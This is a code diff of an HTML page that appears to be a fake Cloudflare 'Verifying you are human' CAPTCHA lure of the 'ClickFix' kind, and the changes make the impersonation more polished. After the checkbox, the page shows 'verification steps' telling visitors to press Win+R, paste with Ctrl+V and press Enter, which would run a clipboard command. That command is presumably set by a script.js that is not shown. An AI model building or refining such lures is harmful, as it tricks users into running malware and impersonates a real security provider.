@@ -3,45 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifying you are human...</title>
+    <title>Just a moment...</title>
+    <link rel="icon" href="https://www.cloudflare.com/favicon.ico">
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
+    <div class="container">
+        <h1 class="title">Just a moment...</h1>
+        <p class="subtitle">Verifying you are human. This may take a few seconds.</p>
 
-    <div id="captcha-container">
-        <h1 id="domain-name">Loading...</h1>
-        <p>Verifying you are human. This may take a few seconds.</p>
-
-        <div id="captcha-box">
-            <input type="checkbox" id="fake-captcha">
-            <label for="fake-captcha">
-                <span id="captcha-text">Verify you are human</span>
-                <img src="cloudflare.png" alt="Cloudflare Logo">
+        <!-- Cloudflare CAPTCHA Box -->
+        <div class="captcha-container">
+            <label class="captcha-label">
+                <input type="checkbox" id="captchaCheckbox">
+                <span class="captcha-box"></span>
+                <span class="captcha-text">Verify you are human</span>
             </label>
+            <img src="https://www.cloudflare.com/img/logo-cloudflare-dark.svg" class="cloudflare-logo">
         </div>
 
-        <p id="security-text">This site needs to review the security of your connection before proceeding.</p>
-        <div id="spinner" class="hidden"></div>
-    </div>
+        <!-- Spinner (Hidden Initially) -->
+        <div class="spinner-container" id="loadingSpinner">
+            <div class="spinner"></div>
+            <p class="verifying-text">Verifying...</p>
+        </div>
 
-    <div id="popup" class="hidden">
-        <div id="popup-content">
-            <h2>Security by Cloudflare</h2>
-            <p><b>Verification steps</b></p>
+        <!-- Verification Box (Hidden Initially) -->
+        <div class="verification-box" id="verificationBox">
+            <strong>Security by Cloudflare</strong>
+            <p>Verification steps:</p>
             <ol>
-                <li>Press & hold <b>Win + R</b></li>
-                <li>Press <b>Ctrl + V</b> in the verification window</li>
-                <li>Press <b>Enter</b></li>
+                <li>Press & hold <strong>Win + R</strong></li>
+                <li>Press <strong>Ctrl + V</strong> in the verification window</li>
+                <li>Press <strong>Enter</strong></li>
             </ol>
-            <p id="verify-id">Verification ID: <span id="ray-id"></span></p>
-            <button id="verify-btn">VERIFY</button>
+            <p><strong>Verification ID:</strong> <span id="rayID"></span></p>
+            <button class="verify-btn" onclick="copyRayID()">VERIFY</button>
         </div>
-    </div>
 
-    <footer>
-        Ray ID: <span id="footer-ray-id"></span>
-        <br>Performance & security by Cloudflare
-    </footer>
+        <!-- Cloudflare Footer -->
+        <p class="ray-id">Ray ID: <span id="footerRayID"></span></p>
+        <p class="footer">
+            <a href="https://www.cloudflare.com/privacypolicy/" target="_blank">Privacy</a> • 
+            <a href="https://www.cloudflare.com/en-us/website-terms/" target="_blank">Terms</a>
+        </p>
+    </div>
 
     <script src="script.js"></script>
 </body>
